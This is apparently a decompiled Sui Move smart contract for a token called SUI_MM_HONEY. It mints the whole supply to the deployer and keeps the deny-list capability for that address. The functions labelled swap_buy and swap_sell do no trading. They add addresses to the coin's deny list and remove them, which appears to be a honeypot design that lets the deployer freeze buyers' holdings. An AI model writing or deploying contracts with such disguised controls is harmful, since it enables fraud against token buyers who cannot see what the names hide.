module 0x14679672b3af1af97e46bba96e5f61399fdd9f69913ed999cca5b6960128c787::sui_mm_honey {
    struct SUI_MM_HONEY has drop {
        dummy_field: bool,
    }

    fun init(arg0: SUI_MM_HONEY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUI_MM_HONEY>(arg0, 6, b"SUI_MM_HONEY", b"", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRXULSyBe271rd44qmXHrbCYEbe9GQi6aWbHrFhdZQAEC"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SUI_MM_HONEY>(&mut v3, 1000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUI_MM_HONEY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SUI_MM_HONEY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUI_MM_HONEY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUI_MM_HONEY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUI_MM_HONEY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUI_MM_HONEY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUI_MM_HONEY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

